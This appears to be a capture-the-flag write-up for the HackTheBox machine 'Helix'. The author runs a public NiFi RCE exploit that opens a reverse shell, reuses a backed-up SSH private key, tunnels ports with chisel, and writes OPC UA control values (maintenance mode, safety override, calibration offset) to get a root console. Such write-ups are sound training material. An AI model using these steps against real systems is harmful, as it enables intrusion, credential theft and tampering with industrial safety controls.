# Helix: A HackTheBox Machine

## Enumeration

- Nmap scan reveals ports 22,80 open
- Port 80 is running 2 vhosts, helix.htb and flow.helix.htb


## Initial Foothold

- **flow.helix.htb** is running an instance of Apache NiFi 1.21.0, which is vulnerable to this [rce exploit](https://github.com/Al3xx-sec/CVE-2023-34468-POC/blob/main/CVE-2023-34468_poc.py).
- So I ran the exploit using the following command to gain RCE:

```bash
python exploit.py --lhost <your_ip> --lport 4444 --target http://flow.helix.htb
```

- To handle the reverse shell I used [penelope](https://github.com/brightio/penelope), for easy handling of the reverse shell. On gaining a connection to it's handler it automatically updates the reverse shell to a pty, and provides modules that you can run for various pivoting and privilege escalation tasks.
- We gain the reverse shell as `nifi@helix`, in the directory `/opt/nifi-1.21.0`.

## Pivoting

- We can check the current nifi directory for any credentials that can give us the system user.
- In the **support-bundles** folder we can find a backed up version of the `operator` user's private ssh key. Copy that onto the attacker machine and ssh into the box as operator.

```bash
ssh -i priv_key.pem operator@helix.htb
```

- This grants the user flag.


## Privilege escalation

- On running `sudo -l` we get this

```
Matching Defaults entries for operator on helix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

- When we run this file we get this:

```
Maintenance window CLOSED.
```

> Note: I actually took a VERY long time to get user, and while enumerating around for any user credentials I ended up figuring out the stuff I describe below to get to MAINTENANCE mode because I assumed that was the pivoting path to user 😂.

- Run `ss -nltp` to get open ports.

```
State            Recv-Q            Send-Q                            Local Address:Port                        Peer Address:Port           Process           
LISTEN           0                 100                                   127.0.0.1:4840                             0.0.0.0:*                                
LISTEN           0                 128                                     0.0.0.0:22                               0.0.0.0:*                                
LISTEN           0                 50                                    127.0.0.1:41763                            0.0.0.0:*                                
LISTEN           0                 511                                     0.0.0.0:80                               0.0.0.0:*                                
LISTEN           0                 4096                              127.0.0.53%lo:53                               0.0.0.0:*                                
LISTEN           0                 128                                   127.0.0.1:8081                             0.0.0.0:*                                
LISTEN           0                 50                                    127.0.0.1:8080                             0.0.0.0:*                                
LISTEN           0                 128                                        [::]:22                                  [::]:*                                
LISTEN           0                 50                           [::ffff:127.0.0.1]:45047                                  *:*
```

- We can use `curl` on each port to see which ports are open. Here, 4840, 8081 and 8080 were open.
- Port 8080 is just running our apache nifi instance so it's nothing to be concerned about for now.
- Port 4840 is running an [OPC UA](https://hacktricks.wiki/en/network-services-pentesting/4840-pentesting-opc-ua.html) instance.
- Port 8081 is running a Helix HMI (HMI = Human Machine Interface). So I forwarded port 4840 and 8081 by uploading chisel from the penelope module and then forwarding the 2 ports using [chisel](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel).


- To interact with the OPC UA server, we need to download [ProSys OPC UA Browser](https://prosysopc.com/products/opc-ua-browser/).
- Once it's downloaded we can simply enter the server URL, which is http://127.0.0.1:4840/helix (got this url from the page source of the Helix HMI running on port 8081).


- Now to enter maintenance mode, we first open the `control` section of the OPC Server (it comes under `Plant`) and set the mode to MAINTENANCE. Do this by right clicking the field and clicking *write value*.
- Under the same section set **TestOverride** to true.
- Under the `reactor` section, select **CalibrationOffset** and set it to 11.0, the idea is that we need the temperature to be at exactly 295.x (x being any integer value) to prevent the trip from activating safety systems.


- Now, when we run `sudo /usr/local/sbin/helix-maint-console`, we get this:

```bash
operator@helix:/tmp$ sudo /usr/local/sbin/helix-maint-console
[+] Privileged maintenance access granted
[!] Window expires in 83 seconds
[!] Session will be terminated automatically
root@helix:/tmp#
```

- We are ROOT!!!
- Navigate to the root directory and get the flag.


Happy Hacking :)
